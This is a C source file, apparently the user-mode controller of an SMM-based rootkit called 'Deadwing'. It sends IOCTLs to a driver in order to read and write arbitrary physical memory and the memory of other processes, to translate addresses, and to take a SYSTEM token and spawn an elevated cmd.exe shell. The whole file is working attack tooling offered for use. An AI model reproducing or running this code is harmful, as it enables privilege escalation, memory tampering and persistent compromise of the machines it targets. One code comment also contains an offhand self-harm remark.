#define _CRT_SECURE_NO_WARNINGS

#include <Windows.h>
#include <memoryapi.h>
#include <stdio.h>

#include "Defs.h"
#include "HexDump.h"

#define SIGNATURE_16(A, B)        ((A) | (B << 8))
#define SIGNATURE_32(A, B, C, D)  (SIGNATURE_16 (A, B) | (SIGNATURE_16 (C, D) << 16))

#define IOCTL_DEADWING_PING_SMI        CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD000, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_CACHE_SESSION   CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD002, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_READ_PHYS       CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD003, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_READ_VIRTUAL    CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD004, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_WRITE_PHYS      CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD005, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_WRITE_VIRTUAL   CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD006, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_VIRT_TO_PHYS    CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD008, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_DEADWING_PRIV_ESC        CTL_CODE(FILE_DEVICE_UNKNOWN, 0xD00A, METHOD_BUFFERED, FILE_ANY_ACCESS)


/**
 * \brief Pings SMI handler
 * 
 * \param hDriver Driver handle
 */
BOOLEAN
WINAPI
CmdPing(
	_In_ HANDLE hDriver
) {
	BOOLEAN Status;
	DEADWING_UM_KM_COMMUNICATION Dummy = { 0 };

	DWORD Ret = 0;
	Status = DeviceIoControl(hDriver, IOCTL_DEADWING_PING_SMI, &Dummy, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL);
	if(!Status)
		wprintf(L"[ DeadwingUM ] SMI handler is unavailable! Terminating program\n");
	else
		wprintf(L"[ DeadwingUM ] SMI handler presents in the current session\n");

	return Status;
}

/**
 * \brief Enables the SMM driver to cache information about the current session
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdCacheSessionInfo(
	_In_ HANDLE hDriver
) {
	wprintf(L"[ DeadwingUM ] Caching session\n");

	DWORD Pid = GetCurrentProcessId();
	DEADWING_UM_KM_COMMUNICATION Packet;
	Packet.ProcessId = Pid;

	DWORD Ret = 0;
	BOOLEAN Status = DeviceIoControl(hDriver, IOCTL_DEADWING_CACHE_SESSION, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL);
	if(!Status)
		wprintf(L"[ DeadwingUM ] Unable to cache session information! Try again\n");
	else
		wprintf(L"[ DeadwingUM ] Session has been cached. You can work now\n");
}

/**
 * \brief Physical read operation handler
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdPhysRead(
	_In_ HANDLE hDriver
) {
	UINT64 Address = 0;
	UINT64 LengthToRead = 0;

	wprintf(L"[ DeadwingUM ] Provide address to read (example: 87AA00BB): ");
	wscanf(L"%llX", &Address);

	wprintf(L"[ DeadwingUM ] Provide size to read (<= 4KB): ");
	wscanf(L"%lld", &LengthToRead);

	// setup packet for the KM driver
	// 1. validate user input
	// 2. allocate buffer for the result
	// 3. fill the packet
	// 4. send it to the driver
	if((Address == 0 || (LengthToRead > 0x1000 || LengthToRead == 0))) {
		wprintf(L"[ DeadwingUM ] Invalid user input\n");
		return;
	}

	PVOID Buf = VirtualAlloc(NULL, LengthToRead, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if(Buf == NULL) {
		wprintf(L"[ DeadwingUM ] Unable to allocate buffer for the read result\n");
		return;
	}

	memset(Buf, 0, LengthToRead);

	DEADWING_UM_KM_COMMUNICATION Packet;
	Packet.Read.PhysReadAddress = (PVOID)Address;
	Packet.Read.VaReadResultAddress = (PVOID)Buf;
	Packet.Read.ReadLength = LengthToRead;

	DWORD Ret = 0;
	if(!DeviceIoControl(hDriver, IOCTL_DEADWING_READ_PHYS, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
		wprintf(L"[ DeadwingUM ] Cannot read from provided physical address\n");
		VirtualFree(Buf, 0, MEM_RELEASE);
		return;
	}

	wprintf(L"[ DeadwingUM ] Succesfully read from physical address. Received data: \n\n");
	HexDump(Buf, LengthToRead);

	VirtualFree(Buf, 0, MEM_RELEASE);
}

/**
 * \brief Virtual read operation handler
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdVaRead(
	_In_ HANDLE hDriver
) {
	UINT64 Address = 0;
	UINT64 LengthToRead = 0;
	UINT64 ProcessId = 0;

	wprintf(L"[ DeadwingUM ] Provide PID of the target process: ");
	wscanf(L"%lld", &ProcessId);

	wprintf(L"[ DeadwingUM ] Provide address to read (example: 87AA00BB): ");
	wscanf(L"%llX", &Address);

	wprintf(L"[ DeadwingUM ] Provide size to read (<= 4KB): ");
	wscanf(L"%lld", &LengthToRead);

	// setup packet for the KM driver
	// 1. validate user input
	// 2. allocate buffer for the result
	// 3. fill the packet
	// 4. send it to the driver
	if((Address == 0 || ProcessId == 0 || (LengthToRead > 0x1000 || LengthToRead == 0))) {
		wprintf(L"[ DeadwingUM ] Invalid user input\n");
		return;
	}

	PVOID Buf = VirtualAlloc(NULL, LengthToRead, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if(Buf == NULL) {
		wprintf(L"[ DeadwingUM ] Unable to allocate buffer for the read result\n");
		return;
	}

	memset(Buf, 0, LengthToRead);

	DEADWING_UM_KM_COMMUNICATION Packet;
	Packet.ProcessId = ProcessId;
	Packet.Read.VaReadAddress = (PVOID)Address;
	Packet.Read.VaReadResultAddress = (PVOID)Buf;
	Packet.Read.ReadLength = LengthToRead;

	DWORD Ret = 0;
	if(!DeviceIoControl(hDriver, IOCTL_DEADWING_READ_VIRTUAL, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
		wprintf(L"[ DeadwingUM ] Cannot read from provided virtual address\n");
		VirtualFree(Buf, 0, MEM_RELEASE);
		return;
	}

	wprintf(L"[ DeadwingUM ] Succesfully read from virtual address. Received data: \n\n");
	HexDump(Buf, LengthToRead);

	VirtualFree(Buf, 0, MEM_RELEASE);
}

/**
 * \brief Physical write operation handler
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdPhysWrite(
	_In_ HANDLE hDriver
) {
	UINT64 Address = 0;
	UINT64 LengthToWrite = 0;

	wprintf(L"[ DeadwingUM ] Provide address to write (example: 87AA00BB): ");
	wscanf(L"%llX", &Address);

	wprintf(L"[ DeadwingUM ] Provide a length value to write (<= 4KB): ");
	wscanf(L"%lld", &LengthToWrite);

	// setup packet for the KM driver
	// 1. validate user input
	// 2. allocate buffer for the data which will be written (0x90 for example)
	// 3. fill the packet
	// 4. send it to the driver
	if (Address == 0 || (LengthToWrite > 0x1000 || LengthToWrite == 0)) {
		wprintf(L"[ DeadwingUM ] Invalid user input\n");
		return;
	}

	PVOID Buf = VirtualAlloc(NULL, LengthToWrite, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (Buf == NULL) {
		wprintf(L"[ DeadwingUM ] Unable to allocate buffer for the data to write\n");
		return;
	}

	// this is for example
	memset(Buf, 0x90, LengthToWrite);

	DEADWING_UM_KM_COMMUNICATION Packet;
	Packet.Write.PhysWriteAddress = (PVOID)Address;
	Packet.Write.VaDataAddress = (PVOID)Buf;
	Packet.Write.WriteLength = LengthToWrite;

	DWORD Ret = 0;
	if (!DeviceIoControl(hDriver, IOCTL_DEADWING_WRITE_PHYS, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
		wprintf(L"[ DeadwingUM ] Cannot write data to provided virtual address\n");
		VirtualFree(Buf, 0, MEM_RELEASE);
		return;
	}

	wprintf(L"[ DeadwingUM ] Succesfully written data to provided address\n");

	VirtualFree(Buf, 0, MEM_RELEASE);
}

/**
 * \brief Virtual address write operation handler
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdVaWrite(
	_In_ HANDLE hDriver
) {
	UINT64 Address = 0;
	UINT64 LengthToWrite = 0;
	UINT64 ProcessId = 0;

	wprintf(L"[ DeadwingUM ] Provide PID of the target process: ");
	wscanf(L"%lld", &ProcessId);

	wprintf(L"[ DeadwingUM ] Provide address to write (example: 87AA00BB): ");
	wscanf(L"%llX", &Address);

	wprintf(L"[ DeadwingUM ] Provide a length value to write (<= 4KB): ");
	wscanf(L"%lld", &LengthToWrite);

	// setup packet for the KM driver
	// 1. validate user input
	// 2. allocate buffer for the data which will be written (0x90 for example)
	// 3. fill the packet
	// 4. send it to the driver
	if(Address == 0 || ProcessId == 0 || (LengthToWrite > 0x1000 || LengthToWrite == 0)) {
		wprintf(L"[ DeadwingUM ] Invalid user input\n");
		return;
	}

	PVOID Buf = VirtualAlloc(NULL, LengthToWrite, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if(Buf == NULL) {
		wprintf(L"[ DeadwingUM ] Unable to allocate buffer for the data to write\n");
		return;
	}

	// this is for example
	memset(Buf, 0x90, LengthToWrite);

	DEADWING_UM_KM_COMMUNICATION Packet;
	Packet.ProcessId = ProcessId;
	Packet.Write.VaWriteAddress = (PVOID)Address;
	Packet.Write.VaDataAddress = (PVOID)Buf;
	Packet.Write.WriteLength = LengthToWrite;

	DWORD Ret = 0;
	if(!DeviceIoControl(hDriver, IOCTL_DEADWING_WRITE_VIRTUAL, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
		wprintf(L"[ DeadwingUM ] Cannot write data to provided virtual address\n");
		VirtualFree(Buf, 0, MEM_RELEASE);
		return;
	}

	wprintf(L"[ DeadwingUM ] Succesfully written data to provided address\n");

	VirtualFree(Buf, 0, MEM_RELEASE);
}

/**
 * \brief VTOP command handler
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdVtop(
	_In_ HANDLE hDriver
) {
	UINT64 ProcessId = 0;
	UINT64 Address = 0;

	wprintf(L"[ DeadwingUM ] Provide PID of the target process: ");
	wscanf(L"%lld", &ProcessId);

	wprintf(L"[ DeadwingUM ] Provide address to translate (example: 87AA00BB): ");
	wscanf(L"%llX", &Address);

	if(!ProcessId || !Address) {
		wprintf(L"[ DeadwingUM ] Invalid user input\n");
		return;
	}

	DEADWING_UM_KM_COMMUNICATION Output = { 0 };
	DEADWING_UM_KM_COMMUNICATION Packet = { 0 };
	Packet.ProcessId = ProcessId;
	Packet.Vtop.AddressToTranslate = (PVOID)Address;
	Packet.Vtop.Translated = 0;

	DWORD Ret = 0;
	if(!DeviceIoControl(hDriver, IOCTL_DEADWING_VIRT_TO_PHYS, &Packet, sizeof(DEADWING_UM_KM_COMMUNICATION), &Output, sizeof(DEADWING_UM_KM_COMMUNICATION), &Ret, NULL)) {
		wprintf(L"[ DeadwingUM ] Unable to translate virtual address\n");
		return;
	}

	wprintf(L"[ DeadwingUM ] The virtual address 0x%llX corresponds to the physical address 0x%llX\n", Address, Output.Vtop.Translated);
}

/**
 * \brief Leveraging privileges for the controller process
 * 
 * \param hDriver Driver handle
 */
VOID
WINAPI
CmdEscPriv(
	_In_ HANDLE hDriver
) {
	wprintf(L"[ DeadwingUM ] Obtaining system token..\n");

	DWORD Ret = 0;
	DEADWING_UM_KM_COMMUNICATION Dummy = { 0 };
	if(!DeviceIoControl(hDriver, IOCTL_DEADWING_PRIV_ESC, &Dummy, sizeof(DEADWING_UM_KM_COMMUNICATION), NULL, 0, &Ret, NULL)) {
		wprintf(L"[ DeadwingUM ] Unable to leverage privileges\n");
		return;
	}

	wprintf(L"[ DeadwingUM ] Spawning system shell\n");

	/// \todo @0x00Alchemist: remove hardcoded path

	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { .cb = sizeof(STARTUPINFOW) };
	if(!CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &Si, &Pi))
		wprintf(L"[ DeadwingUM ] Unable to spawn system shell\n");
}

/**
 * \brief Shows available commands
 */
VOID
WINAPI
CmdHelp(
	VOID
) {
	CONST WCHAR *CommandList[] = {
		{ L"[+] ping - Ping SMI handler (warn: program will be terminated if this call fails)\n" },
		{ L"[+] cache - Caches current session: caches system process, controller process\n" },
		{ L"[+] varead - Read from specific virtual address\n" },
		{ L"[+] physread - Read from specific physical address\n" },
		{ L"[+] vawrite - Write to the specific virtual address\n" },
		{ L"[+] physwrite - Write to the specific physical address\n" },
		{ L"[+] vtop - Translates virtual address to the physical\n" },
		{ L"[+] priv - Leverages privileges of the current process\n" },
		{ L"[+] exit - Exit from the program (without service termination)\n"},
		{ L"[+] term - Exit from the program and terminate service\n"}
	};
	
	for(INT i = 0; i < (sizeof(CommandList) / sizeof(*CommandList)); i++)
		wprintf(L"%s", CommandList[i]);
}

/**
 * \brief Main command dispatcher
 * 
 * \param Command           Command which should be executed
 * \param hDriver           Driver handle
 * \param TerminationSignal Signalizes if service should be deleted
 * 
 * \returns TRUE if user exited from program (or SMI handler not available)
 */
BOOLEAN
WINAPI
CmdMainDispatcher(
	_In_  PWCHAR   Command,
	_In_  HANDLE   hDriver,
	_Out_ PBOOLEAN TerminationSignal
) {
	BOOLEAN ExitSignal = FALSE;
	*TerminationSignal = FALSE;
	
	// perhaps i should kill myself
	if(!wcscmp(Command, L"ping")) {
		if(!CmdPing(hDriver)) {
			ExitSignal = TRUE;
			*TerminationSignal = TRUE;
		}
	} else if(!wcscmp(Command, L"cache")) {
		CmdCacheSessionInfo(hDriver);
	} else if(!wcscmp(Command, L"physread")) {
		CmdPhysRead(hDriver);
	} else if (!wcscmp(Command, L"varead")) {
		CmdVaRead(hDriver);
	} else if (!wcscmp(Command, L"physwrite")) {
		CmdPhysWrite(hDriver);
	} else if(!wcscmp(Command, L"vawrite")) {
		CmdVaWrite(hDriver);
	} else if (!wcscmp(Command, L"vtop")) {
		CmdVtop(hDriver);
	} else if (!wcscmp(Command, L"priv")) {
		CmdEscPriv(hDriver);
	} else if (!wcscmp(Command, L"exit")) {
		ExitSignal = TRUE;
	} else if(!wcscmp(Command, L"term")) {
		ExitSignal = TRUE;
		*TerminationSignal = TRUE;
	} else {
		CmdHelp();
	}

	return ExitSignal;
}
